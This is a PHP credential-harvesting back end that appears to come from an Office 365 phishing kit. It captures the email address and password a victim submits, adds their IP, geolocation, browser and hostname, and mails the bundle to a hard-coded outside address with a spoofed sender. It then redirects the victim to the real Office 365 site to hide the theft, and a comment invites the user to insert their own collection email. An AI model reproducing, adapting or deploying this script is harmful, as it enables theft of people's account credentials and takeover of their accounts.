<?php
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));

$country = stripslashes(ucfirst($addr_details['geoplugin_countryName']));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "";
$message = "-----------------+ OFFICE Log   +-----------------\n";
$message .= "Email Address        : ".$_POST['id']."\n";
$message .= "Password          : ".$_POST['pass']."\n";
$message .= "-------------IP Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------\n";

//change ur email here
$send = "sz@outlook.com";
$subject = "OFFICE 365 | " . $ip . "\n";
$headers = "From: Bearish <bullish@f0rex.com>";
$arr=array($IP);
//foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
//mail($to,$subject,$message,$headers);

 }
 $id = $_POST['id'];
	header("Location: https://office365.com");




 
    //header("Location: index.php");
	
  

?>